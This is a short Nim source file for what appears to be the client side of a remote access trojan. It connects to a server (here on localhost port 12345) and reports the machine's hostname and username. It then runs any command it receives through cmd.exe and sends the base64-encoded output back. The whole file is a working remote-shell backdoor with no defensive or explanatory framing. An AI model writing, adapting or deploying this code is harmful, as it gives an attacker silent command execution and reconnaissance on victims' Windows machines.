import net, strformat, strutils, osproc, os, base64

import modules

let client: Socket = newSocket()
client.connect("127.0.0.1", Port(12345))
stdout.writeLine("Client: connected to server on address 127.0.0.1:12345")

proc receiveCommands(client: Socket) =
    client.send("connect\r\n")
    while true:
        let line = client.recvLine()
        
        let args = line.split(":")
        let argsn = len(args)

        if line.len == 0:
            echo "server down"
            quit(0)
        echo line
        if line == "hi":
            client.send(&"INFO:{hostname()}:{username()}\r\n")
        if line.startsWith("CMD:"):
            # echo "executing: " & 
            let cmd = args[1..(argsn - 1)].join(":")
            try:
                echo getCurrentDir()
                var (output, _) = execCmdEx("cmd.exe /c " & cmd, workingDir = getCurrentDir())
                client.send(&"OUTPUT:CMD:{encode(output)}\r\n")
            except OSError:
                client.send(&"OUTPUT:CMD:{encode(getCurrentExceptionMsg())}\r\n")
receiveCommands(client)
  
client.close()
